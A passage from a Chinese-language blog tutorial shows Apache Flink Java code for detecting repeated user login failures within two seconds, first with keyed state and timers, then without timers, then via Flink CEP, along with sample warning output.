class="function"><span class="keyword">public</span> <span class="title">LoginFailDetectWarning</span><span class="params">(Integer maxFailTimes)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.maxFailTimes = maxFailTimes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      loginFailEventListState = getRuntimeContext().getListState(<span class="keyword">new</span> ListStateDescriptor&lt;LoginEvent&gt;(<span class="string">&quot;login-fail-list&quot;</span>, LoginEvent.class));</span><br><span class="line">      timerTsState = getRuntimeContext().getState(<span class="keyword">new</span> ValueStateDescriptor&lt;Long&gt;(<span class="string">&quot;timer-ts&quot;</span>, Long.class));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTimer</span><span class="params">(<span class="keyword">long</span> timestamp, OnTimerContext ctx, Collector&lt;LoginFailWarning&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// 定时器触发，说明2秒内没有登录成功，判读ListState中失败的个数</span></span><br><span class="line">      ArrayList&lt;LoginEvent&gt; loginFailEvents = Lists.newArrayList(loginFailEventListState.get().iterator());</span><br><span class="line">      <span class="keyword">int</span> failTimes = loginFailEvents.size();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (failTimes &gt;= maxFailTimes) &#123;</span><br><span class="line">        <span class="comment">// 如果超出设定的最大失败次数，输出报警</span></span><br><span class="line">        out.collect(<span class="keyword">new</span> LoginFailWarning(ctx.getCurrentKey(),</span><br><span class="line">                                         loginFailEvents.get(<span class="number">0</span>).getTimestamp(),</span><br><span class="line">                                         loginFailEvents.get(failTimes - <span class="number">1</span>).getTimestamp(),</span><br><span class="line">                                         <span class="string">&quot;login fail in 2s for &quot;</span> + failTimes + <span class="string">&quot; times&quot;</span>));</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 清空状态</span></span><br><span class="line">      loginFailEventListState.clear();</span><br><span class="line">      timerTsState.clear();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(LoginEvent value, Context ctx, Collector&lt;LoginFailWarning&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// 判断当前登录事件类型</span></span><br><span class="line">      <span class="keyword">if</span> (<span class="string">&quot;fail&quot;</span>.equals(value.getLoginState())) &#123;</span><br><span class="line">        <span class="comment">// 1. 如果是失败事件，添加到表状态中</span></span><br><span class="line">        loginFailEventListState.add(value);</span><br><span class="line">        <span class="comment">// 如果没有定时器，注册一个2秒之后的定时器</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">null</span> == timerTsState.value()) &#123;</span><br><span class="line">          <span class="keyword">long</span> ts = (value.getTimestamp() + <span class="number">2</span>) * <span class="number">1000L</span>;</span><br><span class="line">          ctx.timerService().registerEventTimeTimer(ts);</span><br><span class="line">          timerTsState.update(ts);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="comment">// 2. 如果是登录成功，删除定时器，清空状态，重新开始</span></span><br><span class="line">          <span class="keyword">if</span> (<span class="keyword">null</span> != timerTsState.value()) &#123;</span><br><span class="line">            ctx.timerService().deleteEventTimeTimer(timerTsState.value());</span><br><span class="line">          &#125;</span><br><span class="line">          loginFailEventListState.clear();</span><br><span class="line">          timerTsState.clear();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> 输出  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LoginFailWarning&#123;userId=23064, firstFailTime=1558430826, lastFailTime=1558430826, warningMsg=&#x27;login fail in 2s for 1 times&#x27;&#125;</span><br><span class="line">LoginFailWarning&#123;userId=5692, firstFailTime=1558430833, lastFailTime=1558430833, warningMsg=&#x27;login fail in 2s for 1 times&#x27;&#125;</span><br><span class="line">LoginFailWarning&#123;userId=1035, firstFailTime=1558430844, lastFailTime=1558430844, warningMsg=&#x27;login fail in 2s for 1 times&#x27;&#125;</span><br><span class="line">LoginFailWarning&#123;userId=76456, firstFailTime=1558430859, lastFailTime=1558430859, warningMsg=&#x27;login fail in 2s for 1 times&#x27;&#125;</span><br><span class="line">LoginFailWarning&#123;userId=23565, firstFailTime=1558430862, lastFailTime=1558430862, warningMsg=&#x27;login fail in 2s for 1 times&#x27;&#125;</span><br></pre></td></tr></table></figure></li></ul><h6 id="代码2-代码实效性改进"><a href="#代码2-代码实效性改进" class="headerlink" title="代码2-代码实效性改进"></a>代码2-代码实效性改进</h6><ul><li><p> java代码  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> beans.LoginEvent;</span><br><span class="line"><span class="keyword">import</span> beans.LoginFailWarning;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.compress.utils.Lists;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ListState;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ListStateDescriptor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ValueState;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.ValueStateDescriptor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.configuration.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.KeyedProcessFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.runtime.operators.util.AssignerWithPeriodicWatermarksAdapter;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/6 1:49 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginFail</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 从文件中读取数据</span></span><br><span class="line">    URL resource = LoginFail.class.getResource(<span class="string">&quot;/LoginLog.csv&quot;</span>);</span><br><span class="line">    DataStream&lt;LoginEvent&gt; loginEventStream = env.readTextFile(resource.getPath())</span><br><span class="line">      .map(line -&gt; &#123;</span><br><span class="line">        String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> LoginEvent(<span class="keyword">new</span> Long(fields[<span class="number">0</span>]), fields[<span class="number">1</span>], fields[<span class="number">2</span>], <span class="keyword">new</span> Long(fields[<span class="number">3</span>]));</span><br><span class="line">      &#125;)</span><br><span class="line">      .assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">        <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;LoginEvent&gt;(Time.of(<span class="number">200</span>, TimeUnit.MILLISECONDS)) &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(LoginEvent element)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 自定义处理函数检测连续登录失败事件</span></span><br><span class="line">    SingleOutputStreamOperator&lt;LoginFailWarning&gt; warningStream = loginEventStream</span><br><span class="line">      .keyBy(LoginEvent::getUserId)</span><br><span class="line">      .process(<span class="keyword">new</span> LoginFailDetectWarning(<span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">    warningStream.print();</span><br><span class="line"></span><br><span class="line">    env.execute(<span class="string">&quot;login fail detect job&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 实现自定义KeyedProcessFunction</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginFailDetectWarning0</span> <span class="keyword">extends</span> <span class="title">KeyedProcessFunction</span>&lt;<span class="title">Long</span>, <span class="title">LoginEvent</span>, <span class="title">LoginFailWarning</span>&gt;</span>&#123;</span><br><span class="line">    <span class="comment">// 定义属性，最大连续登录失败次数</span></span><br><span class="line">    <span class="keyword">private</span> Integer maxFailTimes;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LoginFailDetectWarning0</span><span class="params">(Integer maxFailTimes)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.maxFailTimes = maxFailTimes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义状态：保存2秒内所有的登录失败事件</span></span><br><span class="line">    ListState&lt;LoginEvent&gt; loginFailEventListState;</span><br><span class="line">    <span class="comment">// 定义状态：保存注册的定时器时间戳</span></span><br><span class="line">    ValueState&lt;Long&gt; timerTsState;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      loginFailEventListState = getRuntimeContext().getListState(<span class="keyword">new</span> ListStateDescriptor&lt;LoginEvent&gt;(<span class="string">&quot;login-fail-list&quot;</span>, LoginEvent.class));</span><br><span class="line">      timerTsState = getRuntimeContext().getState(<span class="keyword">new</span> ValueStateDescriptor&lt;Long&gt;(<span class="string">&quot;timer-ts&quot;</span>, Long.class));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(LoginEvent value, Context ctx, Collector&lt;LoginFailWarning&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// 判断当前登录事件类型</span></span><br><span class="line">      <span class="keyword">if</span>( <span class="string">&quot;fail&quot;</span>.equals(value.getLoginState()) )&#123;</span><br><span class="line">        <span class="comment">// 1. 如果是失败事件，添加到列表状态中</span></span><br><span class="line">        loginFailEventListState.add(value);</span><br><span class="line">        <span class="comment">// 如果没有定时器，注册一个2秒之后的定时器</span></span><br><span class="line">        <span class="keyword">if</span>( timerTsState.value() == <span class="keyword">null</span> )&#123;</span><br><span class="line">          Long ts = (value.getTimestamp() + <span class="number">2</span>) * <span class="number">1000L</span>;</span><br><span class="line">          ctx.timerService().registerEventTimeTimer(ts);</span><br><span class="line">          timerTsState.update(ts);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 2. 如果是登录成功，删除定时器，清空状态，重新开始</span></span><br><span class="line">        <span class="keyword">if</span>( timerTsState.value() != <span class="keyword">null</span> )</span><br><span class="line">          ctx.timerService().deleteEventTimeTimer(timerTsState.value());</span><br><span class="line">        loginFailEventListState.clear();</span><br><span class="line">        timerTsState.clear();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTimer</span><span class="params">(<span class="keyword">long</span> timestamp, OnTimerContext ctx, Collector&lt;LoginFailWarning&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// 定时器触发，说明2秒内没有登录成功来，判断ListState中失败的个数</span></span><br><span class="line">      ArrayList&lt;LoginEvent&gt; loginFailEvents = Lists.newArrayList(loginFailEventListState.get().iterator());</span><br><span class="line">      Integer failTimes = loginFailEvents.size();</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>( failTimes &gt;= maxFailTimes )&#123;</span><br><span class="line">        <span class="comment">// 如果超出设定的最大失败次数，输出报警</span></span><br><span class="line">        out.collect( <span class="keyword">new</span> LoginFailWarning(ctx.getCurrentKey(),</span><br><span class="line">                                          loginFailEvents.get(<span class="number">0</span>).getTimestamp(),</span><br><span class="line">                                          loginFailEvents.get(failTimes - <span class="number">1</span>).getTimestamp(),</span><br><span class="line">                                          <span class="string">&quot;login fail in 2s for &quot;</span> + failTimes + <span class="string">&quot; times&quot;</span>) );</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 清空状态</span></span><br><span class="line">      loginFailEventListState.clear();</span><br><span class="line">      timerTsState.clear();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 实现自定义KeyedProcessFunction</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginFailDetectWarning</span> <span class="keyword">extends</span> <span class="title">KeyedProcessFunction</span>&lt;<span class="title">Long</span>, <span class="title">LoginEvent</span>, <span class="title">LoginFailWarning</span>&gt; </span>&#123;</span><br><span class="line">    <span class="comment">// 定义属性，最大连续登录失败次数</span></span><br><span class="line">    <span class="keyword">private</span> Integer maxFailTimes;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LoginFailDetectWarning</span><span class="params">(Integer maxFailTimes)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.maxFailTimes = maxFailTimes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义状态：保存2秒内所有的登录失败事件</span></span><br><span class="line">    ListState&lt;LoginEvent&gt; loginFailEventListState;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      loginFailEventListState = getRuntimeContext().getListState(<span class="keyword">new</span> ListStateDescriptor&lt;LoginEvent&gt;(<span class="string">&quot;login-fail-list&quot;</span>, LoginEvent.class));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 以登录事件作为判断报警的触发条件，不再注册定时器</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(LoginEvent value, Context ctx, Collector&lt;LoginFailWarning&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">// 判断当前事件登录状态</span></span><br><span class="line">      <span class="keyword">if</span>( <span class="string">&quot;fail&quot;</span>.equals(value.getLoginState()) )&#123;</span><br><span class="line">        <span class="comment">// 1. 如果是登录失败，获取状态中之前的登录失败事件，继续判断是否已有失败事件</span></span><br><span class="line">        Iterator&lt;LoginEvent&gt; iterator = loginFailEventListState.get().iterator();</span><br><span class="line">        <span class="keyword">if</span>( iterator.hasNext() )&#123;</span><br><span class="line">          <span class="comment">// 1.1 如果已经有登录失败事件，继续判断时间戳是否在2秒之内</span></span><br><span class="line">          <span class="comment">// 获取已有的登录失败事件</span></span><br><span class="line">          LoginEvent firstFailEvent = iterator.next();</span><br><span class="line">          <span class="keyword">if</span>( value.getTimestamp() - firstFailEvent.getTimestamp() &lt;= <span class="number">2</span> )&#123;</span><br><span class="line">            <span class="comment">// 1.1.1 如果在2秒之内，输出报警</span></span><br><span class="line">            out.collect( <span class="keyword">new</span> LoginFailWarning(value.getUserId(), firstFailEvent.getTimestamp(), value.getTimestamp(), <span class="string">&quot;login fail 2 times in 2s&quot;</span>) );</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">// 不管报不报警，这次都已处理完毕，直接更新状态</span></span><br><span class="line">          loginFailEventListState.clear();</span><br><span class="line">          loginFailEventListState.add(value);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="comment">// 1.2 如果没有登录失败，直接将当前事件存入ListState</span></span><br><span class="line">          loginFailEventListState.add(value);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 2. 如果是登录成功，直接清空状态</span></span><br><span class="line">        loginFailEventListState.clear();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> 输出  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LoginFailWarning&#123;userId=1035, firstFailTime=1558430842, lastFailTime=1558430843, warningMsg=&#x27;login fail 2 times in 2s&#x27;&#125;</span><br><span class="line">LoginFailWarning&#123;userId=1035, firstFailTime=1558430843, lastFailTime=1558430844, warningMsg=&#x27;login fail 2 times in 2s&#x27;&#125;</span><br></pre></td></tr></table></figure></li></ul><h6 id="代码3-CEP代码实现"><a href="#代码3-CEP代码实现" class="headerlink" title="代码3-CEP代码实现"></a>代码3-CEP代码实现</h6><ul><li><p> pom依赖<br>CEP编程  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-cep_$&#123;scala.binary.version&#125;<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;flink.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p> java代码  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> beans.LoginEvent;</span><br><span class="line"><span class="keyword">import</span> beans.LoginFailWarning;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.cep.CEP;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.cep.PatternSelectFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.cep.PatternStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.cep.pattern.Pattern;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.cep.pattern.conditions.SimpleCondition;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.runtime.operators.util.AssignerWithPeriodicWatermarksAdapter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/6 3:41 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginFailWithCep</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 从文件中读取数据</span></span><br><span class="line">    URL resource = LoginFail.class.getResource(<span class="string">&quot;/LoginLog.csv&quot;</span>);</span><br><span class="line">    DataStream&lt;LoginEvent&gt; loginEventStream = env.readTextFile(resource.getPath())</span><br><span class="line">      .map(line -&gt; &#123;</span><br><span class="line">        String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> LoginEvent(<span class="keyword">new</span> Long(fields[<span class="number">0</span>]), fields[<span class="number">1</span>], fields[<span class="number">2</span>], <span class="keyword">new</span> Long(fields[<span class="number">3</span>]));</span><br><span class="line">      &#125;)</span><br><span class="line">      .assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">        <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;LoginEvent&gt;(Time.of(<span class="number">200</span>, TimeUnit.MILLISECONDS)) &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(LoginEvent element)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> element.getTimestamp() * <span class="number">1000L</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 定义一个匹配模式</span></span><br><span class="line">    <span class="comment">// firstFail -&gt; secondFail, within 2s</span></span><br><span class="line">    Pattern&lt;LoginEvent, LoginEvent&gt; loginFailPattern = Pattern</span><br><span class="line">      .&lt;LoginEvent&gt;begin(<span 